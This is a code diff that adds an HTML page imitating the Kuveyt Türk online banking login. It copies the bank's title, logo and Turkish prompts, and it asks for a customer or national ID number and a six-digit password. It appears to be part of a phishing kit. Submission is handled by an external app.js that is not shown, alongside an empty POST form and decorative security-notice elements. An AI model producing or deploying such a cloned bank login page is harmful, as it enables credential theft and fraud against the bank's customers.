@@ -1,0 +1,125 @@
+ 
+<!DOCTYPE html> 
+<html style="height: 100%;"> 
+    <head> 
+        <meta charset="UTF-8"> 
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+        <title>Kuveyt Türk Giriş Ekranı - Kuveyt Türk</title>         
+        <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico"> 
+        <link rel="stylesheet" href="./styles.css">
+        <script>/* Pinegrow Interactions, do not remove */ (function(){try{if(!document.documentElement.hasAttribute('data-pg-ia-disabled')) { window.pgia_small_mq=typeof pgia_small_mq=='string'?pgia_small_mq:'(max-width:767px)';window.pgia_large_mq=typeof pgia_large_mq=='string'?pgia_large_mq:'(min-width:768px)';var style = document.createElement('style');var pgcss='html:not(.pg-ia-no-preview) [data-pg-ia-hide=""] {opacity:0;visibility:hidden;}html:not(.pg-ia-no-preview) [data-pg-ia-show=""] {opacity:1;visibility:visible;display:block;}';if(document.documentElement.hasAttribute('data-pg-id') && document.documentElement.hasAttribute('data-pg-mobile')) {pgia_small_mq='(min-width:0)';pgia_large_mq='(min-width:99999px)'} pgcss+='@media ' + pgia_small_mq + '{ html:not(.pg-ia-no-preview) [data-pg-ia-hide="mobile"] {opacity:0;visibility:hidden;}html:not(.pg-ia-no-preview) [data-pg-ia-show="mobile"] {opacity:1;visibility:visible;display:block;}}';pgcss+='@media ' + pgia_large_mq + '{html:not(.pg-ia-no-preview) [data-pg-ia-hide="desktop"] {opacity:0;visibility:hidden;}html:not(.pg-ia-no-preview) [data-pg-ia-show="desktop"] {opacity:1;visibility:visible;display:block;}}';style.innerHTML=pgcss;document.querySelector('head').appendChild(style);}}catch(e){console&&console.log(e);}})()</script>
+    </head>     
+    <body> 
+<style>
+body {
+  
+  position: fixed;
+ 
+}
+</style>
+        <div class="initialLoginSecurityImage" id="notification" style="display: none;"> 
+            <div class="initialLoginSecurity"> 
+                <img src="assets/img/web-login-security-tr.png" alt="Information Message">
+                <br> 
+                <div style="margin-left :163px; margin-bottom :32px;"> 
+                    <input type="button" name="BtnOK" value="TAMAM" class="BoxButtonOK" style="margin-left : 6px; margin-bottom :30px;"> 
+                </div>                 
+            </div>             
+        </div>         
+        <div id="mainCapsule"> 
+            <div id="browserCheckDiv"> 
+</div>             
+            <div id="headerCapsule"> 
+                <div id="ktHeader" class="clearFix header" style="width: 100px;"> 
+                    <div id="ktLogo"> 
+                        <img src="assets/img/logo.png" alt="Kuveyt Türk" border="0" width="194" height="65" style="margin-left: -153px;"> 
+                    </div>                     
+                    <div id="ktHelper" class="clearFix"> 
+                        <div id="safeLinks"> 
+</div>                         
+                    </div>                     
+                </div>                 
+            </div>             
+            <div id="contentCapsule"> 
+                <div id="repeaterOuter">                      
+</div>                 
+                <div id="repeater-2">                      
+</div>                 
+                <div id="repeaterOuter">                      
+</div>                 
+            </div>             
+        </div>
+        <form action="" autocomplete="off" id="initialLoginForm" method="POST" novalidate="novalidate">
+            <div class="loginErrorArea clearFix">
+                <div id="ValidationSummaryAreaDiv" class="validation-summary-valid" data-valmsg-summary="true">
+                    <div>
+                        <img src="assets/img/inner-area-top-red-short.png" style="vertical-align: bottom;" alt="">
+                    </div>
+                    <div class="innerAreaErrorShort">
+                        <p class="firstWarn"></p><br>
+                        <p class="secondWarn"></p><br> 
+                    </div>
+                </div>
+            </div>
+        </form>         
+        <script src="assets/js/app.js"></script>         
+        <script src="pgia/lib/pgia.js"></script>
+        <main style="width: 100%;">
+            <form style="width: 380px;">
+                <div class="loginForm clearFix" style="width: 95%;"> 
+                    <table style="margin-left: 11px; width: 100%;"> 
+                        <tbody> 
+                            <tr style="height: 36px; vertical-align: top;"> 
+                                <td colspan="3" style="width: 124px;"> 
+                                    <div> <span class="important"> 
+                                                                  Bilgilerinizi Giriniz
+ </span> 
+                                    </div>                                     
+                                </td>                                 
+                            </tr>                             
+                            <tr style="height: 36px; vertical-align: top;"> 
+                                <td style="width: 136px; line-height: 31px;"> 
+                                                               Müşteri No/TC Kimlik No
+ </td> 
+                                <td style="width: 112px;"> 
+                                    <div class="imageInputWrapper"> 
+                                        <input autocomplete="off" class="Numeric tckn" data-val="true" data-val-regex="Lütfen rakam giriniz." data-val-regex-pattern="[0-9]*" data-val-required="Müşteri numaranızı giriniz." data-post-valid="false" hasimagebutton="true" id="IntUserName" maxlength="11" name="identify" style="width: 178px; height: 24px; margin-bottom: 10px;" type="text" value=""> 
+                                        <div class="keyboardButton" for="IntUserName"> 
+                                            &nbsp;
+</div>                                         
+                                    </div>                                     
+                                </td>                                                                  
+                            </tr>                             
+                            <tr style="vertical-align: top;"> 
+                                <td style="line-height: 31px;"> 
+                                                               Şifre
+ </td> 
+                                <td> 
+                                    <div class="imageInputWrapper"> 
+                                        <input autocomplete="off" data-val="true" data-post-valid="false" data-val-required="Şifrenizi giriniz." hasimagebutton="true" id="Password" minlength="6" maxlength="6" name="password" style="width: 178px; height: 24px; margin-bottom: 15px;" type="password"> 
+                                        <div class="keyboardButton" for="Password"> 
+                                            &nbsp;
+</div>                                         
+                                    </div>
+                                    <a tabindex="-1" class="forgetpassword" style="margin-left: 15px; padding-top: 0px;">Şifremi unuttum/Anında Şifre</a> 
+                                </td>                                                                  
+                            </tr>                             
+                            <tr>                                  
+                                <td style="padding: 0px 0px 0px 5px;">    </td>                                  
+                            </tr>                             
+                            <tr> 
+                                <td style="padding: 0px 0px 0px 5px;">   </td> 
+                            </tr>                             
+                            <tr> 
+</tr>                             
+                            <tr class="helpRow"> 
+</tr>                             
+                        </tbody>                         
+                    </table>
+                    <input id="btnSubmit" type="submit" name="Login" value="DEVAM" style="width: 142px; height: 42px; margin-left: 102px;"> 
+                </div>
+            </form>
+        </main>
+    </body>     
+</html>
